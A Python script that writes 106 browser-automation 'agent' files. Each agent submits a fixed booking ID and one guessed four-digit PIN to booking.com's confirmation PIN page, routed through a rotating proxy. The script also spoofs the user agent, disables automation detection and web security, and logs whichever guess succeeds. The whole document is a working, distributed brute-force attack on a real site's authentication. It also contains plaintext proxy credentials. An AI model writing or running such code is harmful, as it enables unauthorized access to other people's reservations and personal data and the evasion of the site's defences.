#!/usr/bin/env python3
"""
🔧 AGENT FIXER - Fix all agents with proper browser automation
"""

import os

# Enhanced agent template with better error handling and debugging
AGENT_TEMPLATE = '''#!/usr/bin/env python3
from playwright.sync_api import sync_playwright
import sys
from datetime import datetime
import time

AGENT_NUM = {agent_num}
BOOKING_ID = "{booking_id}"
ASSIGNED_PIN = "{pin}"

PROXY_CONFIG = {{
    "server": "http://pr.oxylabs.io:7777",
    "username": "customer-1proxylabs_atNPR-cc-us",
    "password": "1proxylabs_atNPR1"
}}

def test_pin():
    print(f"🚀 Agent #{{AGENT_NUM:03d}}: Starting - Testing PIN {{ASSIGNED_PIN}}")
    
    try:
        with sync_playwright() as p:
            print(f"🌐 Agent #{{AGENT_NUM:03d}}: Launching browser with proxy...")
            
            browser = p.chromium.launch(
                headless=True,
                proxy=PROXY_CONFIG,
                args=[
                    '--no-sandbox',
                    '--disable-dev-shm-usage',
                    '--disable-blink-features=AutomationControlled',
                    '--disable-web-security',
                    '--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                ]
            )
            
            context = browser.new_context(
                viewport={{'width': 1920, 'height': 1080}},
                user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            )
            page = context.new_page()
            
            print(f"📄 Agent #{{AGENT_NUM:03d}}: Navigating to booking.com...")
            
            # Navigate to the page
            page.goto("https://secure.booking.com/help/confirmation_pin_auth", 
                     wait_until="networkidle", timeout=30000)
            
            print(f"⏳ Agent #{{AGENT_NUM:03d}}: Page loaded, waiting for form...")
            time.sleep(2)
            
            # Wait for and fill booking ID
            print(f"📝 Agent #{{AGENT_NUM:03d}}: Filling booking ID {{BOOKING_ID}}...")
            booking_input = page.wait_for_selector('input[placeholder*="1234567890"], input[name*="booking"], input[id*="booking"]', timeout=15000)
            booking_input.fill(BOOKING_ID)
            time.sleep(1)
            
            # Wait for and fill PIN
            print(f"🔐 Agent #{{AGENT_NUM:03d}}: Filling PIN {{ASSIGNED_PIN}}...")
            pin_input = page.wait_for_selector('input[placeholder*="1234"], input[name*="pin"], input[id*="pin"]', timeout=15000)
            pin_input.fill(ASSIGNED_PIN)
            time.sleep(1)
            
            # Submit the form
            print(f"✅ Agent #{{AGENT_NUM:03d}}: Submitting form...")
            try:
                submit_button = page.wait_for_selector('button:has-text("Continue"), button[type="submit"], button:has-text("Submit")', timeout=10000)
                submit_button.click()
            except:
                page.keyboard.press('Enter')
            
            print(f"⏳ Agent #{{AGENT_NUM:03d}}: Waiting for response...")
            
            # Wait for response
            try:
                page.wait_for_load_state("networkidle", timeout=15000)
                time.sleep(3)
            except Exception as wait_error:
                print(f"⚠️ Agent #{{AGENT_NUM:03d}}: Page load timeout, checking response anyway...")
            except:
                print(f"⚠️ Agent #{{AGENT_NUM:03d}}: Timeout waiting for response, checking URL...")
            
            time.sleep(2)
            current_url = page.url
            page_content = page.content()
            
            print(f"🔍 Agent #{{AGENT_NUM:03d}}: Current URL: {{current_url}}")
            
            # Check for success
            if "unique_order_id=" in current_url:
                success_msg = f"MEGA_SUCCESS|AGENT_{{AGENT_NUM:03d}}|PIN_{{ASSIGNED_PIN}}|{{current_url}}|{{datetime.now()}}"
                print(f"🎉🎉🎉 Agent #{{AGENT_NUM:03d}}: SUCCESS! PIN {{ASSIGNED_PIN}} is CORRECT! 🎉🎉🎉")
                print(success_msg)
                
                with open("MEGA_SUCCESS.txt", "w") as f:
                    f.write(success_msg)
                
                browser.close()
                return True
            else:
                # Check for specific error messages
                if "error" in page_content.lower() or "invalid" in page_content.lower():
                    print(f"❌ Agent #{{AGENT_NUM:03d}}: PIN {{ASSIGNED_PIN}} - Invalid PIN")
                else:
                    print(f"❓ Agent #{{AGENT_NUM:03d}}: PIN {{ASSIGNED_PIN}} - Unknown response")
                
                browser.close()
                return False
                
    except Exception as e:
        print(f"💥 Agent #{{AGENT_NUM:03d}}: Error - {{str(e)}}")
        return False

if __name__ == "__main__":
    success = test_pin()
    sys.exit(0 if success else 1)
'''

def fix_all_agents():
    print("🔧 FIXING ALL AGENTS - Enhanced Browser Automation")
    print("=" * 60)
    
    agents_dir = "agents"
    if not os.path.exists(agents_dir):
        print("❌ Agents directory not found!")
        return
    
    # PIN list
    pins = [
        "6812", "9457", "3021", "7834", "1569", "4782", "8903", "2156", "6374", "9018",
        "5647", "3829", "7412", "1095", "8263", "4756", "2901", "6538", "9174", "3607",
        "7920", "1483", "5826", "8359", "2074", "6741", "9285", "4618", "7052", "3496",
        "8730", "1864", "5207", "9541", "2983", "6416", "7659", "4072", "8394", "1528",
        "5861", "9203", "3547", "7786", "2419", "6052", "8675", "4138", "7294", "1807",
        "5463", "9620", "3856", "7129", "2741", "6384", "8517", "4970", "7603", "1246",
        "5689", "9032", "3475", "7818", "2164", "6527", "8950", "4293", "7736", "1581",
        "5024", "9367", "3709", "7142", "2485", "6758", "8091", "4624", "7307", "1953",
        "5486", "9729", "3062", "7495", "2818", "6341", "8674", "4057", "7580", "1296",
        "5739", "9183", "3426", "7652", "2004", "6815", "9238", "4571", "7894", "1327",
        "5460", "8795", "3682", "7019", "4335", "7210", "6048", "1795", "9204", "2874"
    ]
    
    booking_id = "5724349472"
    
    fixed_count = 0
    
    for i in range(1, 107):  # 106 agents
        agent_file = f"agent_{i:03d}.py"
        agent_path = os.path.join(agents_dir, agent_file)
        
        if i <= len(pins):
            pin = pins[i-1]
        else:
            pin = "0000"  # fallback
        
        # Create enhanced agent content
        agent_content = AGENT_TEMPLATE.format(
            agent_num=i,
            booking_id=booking_id,
            pin=pin
        )
        
        try:
            with open(agent_path, 'w', encoding='utf-8') as f:
                f.write(agent_content)
            print(f"🔧 Fixed agent_{i:03d}.py → PIN {pin}")
            fixed_count += 1
        except Exception as e:
            print(f"❌ Failed to fix agent_{i:03d}.py: {e}")
    
    print("=" * 60)
    print(f"🎉 FIXED {fixed_count} agents with enhanced browser automation!")
    print("🚀 Agents now have:")
    print("   • Better error handling")
    print("   • More flexible selectors")
    print("   • Enhanced debugging output")
    print("   • Improved timeout handling")
    print("   • User agent spoofing")

if __name__ == "__main__":
    fix_all_agents()
